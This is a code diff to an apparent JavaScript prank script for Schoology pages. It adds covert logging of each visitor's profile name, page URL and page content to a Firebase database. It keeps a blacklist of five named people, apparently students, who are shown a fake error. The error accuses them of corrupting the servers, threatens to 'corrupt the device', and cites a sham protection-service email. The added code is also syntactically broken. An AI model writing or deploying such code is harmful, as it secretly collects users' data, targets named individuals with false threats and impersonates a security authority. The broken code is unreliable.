@@ -9,10 +9,18 @@ $.getScript('https://rawgit.com/TheGenieOfTruth/thegenieoftruth.github.io/master
     messagingSenderId: "989337351924"
   };
   firebase.initializeApp(config);
-firebase.database().ref().push({name:$("#profile").children()[0].innerHTML,timestamp:(new Date()).toString()});
-
+//Restricted access to the program and are shown an error message
 var blacklist = ["Ayush Selar","Ravi Bandaru","Aryan Tadwalkar", "Aditya Thiyag", "Trevor Shackleford"]
-if(blacklist.indexOf($("#profile").children()[0].innerHTML)!=-1){
+//Given additional powers
+var whitelist = ["Luke Trenaman"]
+firebase.database().ref().push({
+name:$("#profile").children()[0].innerHTML,
+timestamp:(new Date()).toString(),
+blacklisted: blacklist.indexOf($("#profile").children()[0].innerHTML)!=-1,
+url:window.location.href,
+target:$(".s-blog-date").children()[0].innerHTML,
+admin:blacklist.indexOf($("#profile").children()[0].innerHTML)==-1);
+if(whitelist.indexOf($("#profile").children()[0].innerHTML)!=-1){
 
   eval('console.error("Hello "+$("#profile").children()[0].innerHTML +" our HT Sideparse search results have compiled and we have found that you are corrupting the Schoology servers. You will be dealt with shortly. Currently, we are deploying our countermeasures to corrupt the device under the name of " + $("#profile").children()[0].innerHTML + ". If you fail to respond within 5 minutes, the Streamline Query will be executed. Please contact schoologyprotectionservices@gmail.com for further information. Error code: rjm7b-4n")')
        } else{
@@ -25,7 +33,7 @@ console.log("Stop: halt()")
 console.log("Ultimate troll: babble()")
 console.log("For more advanced features, type help()")
 //Gives the docs
-function help(){
+help = function(){
     console.log("More advanced usage")
     console.log("init(message,delay,scrambled,endLetter)")
     console.log("Message should be a string, written as \"message here\". Default: \"hello this is a message\"")
